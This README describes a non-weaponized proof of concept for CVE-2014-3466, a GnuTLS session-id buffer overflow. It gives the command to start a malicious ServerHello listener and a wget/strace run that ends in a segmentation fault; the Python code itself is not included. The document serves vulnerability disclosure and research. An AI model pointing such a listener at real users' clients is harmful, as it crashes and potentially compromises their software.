## Proof of Concept for CVE-2014-3466 (GnuTLS buffer overflow: session id length check)
### Information
See: https://bugzilla.redhat.com/show_bug.cgi?id=1101932

**This is not a weaponized exploit.**

be warned: this python code is ugly, I pretty much handcrafted the ServerHello and spent only about five minutes on the python part itself. 

feel free to improve this exploit as you wish (keep me in the loop if possible!).

### Example
start the listener with the malicious `ServerHello` code:
```bash
$ python poc.py 4433
```


connect with a client linked to a vulnerable version of GnuTLS (e.g. `wget` on Debian):
```bash
$ ldd $(which wget) 
	linux-vdso.so.1 (0x00007ffff290c000)
	libnettle.so.4 => /usr/lib/x86_64-linux-gnu/libnettle.so.4 (0x00007fa8a026e000)
	libgnutls.so.28 => /usr/lib/x86_64-linux-gnu/libgnutls.so.28 (0x00007fa89ff5c000)
	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fa89fd43000)
	libidn.so.11 => /usr/lib/x86_64-linux-gnu/libidn.so.11 (0x00007fa89fb10000)
	libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007fa89f90b000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa89f560000)
	libp11-kit.so.0 => /usr/lib/x86_64-linux-gnu/libp11-kit.so.0 (0x00007fa89f31e000)
	libtasn1.so.6 => /usr/lib/x86_64-linux-gnu/libtasn1.so.6 (0x00007fa89f10a000)
	libhogweed.so.2 => /usr/lib/x86_64-linux-gnu/libhogweed.so.2 (0x00007fa89eeda000)
	libgmp.so.10 => /usr/lib/x86_64-linux-gnu/libgmp.so.10 (0x00007fa89ec61000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fa8a04bc000)
	libffi.so.6 => /usr/lib/x86_64-linux-gnu/libffi.so.6 (0x00007fa89ea59000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa89e854000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fa89e637000)
$ strace wget -d https://localhost:4433

[...]

recvfrom(4, "\2\0\0\366\3\1S\213\177c\301\16\35r\n\263\370\247\17\365]ieXB\200\301\373O\333\232\252"..., 250, 0, NULL, NULL) = 250
write(2, "GnuTLS: No supported cipher suit"..., 52GnuTLS: No supported cipher suites have been found.
) = 52
) --- SIGSEGV (Segmentation fault) @ 0 (0) ---
) +++ killed by SIGSEGV +++
) Segmentation fault
```

No time to test this further at the moment, enjoy.

## License
CC BY 3.0: https://creativecommons.org/licenses/by/3.0/
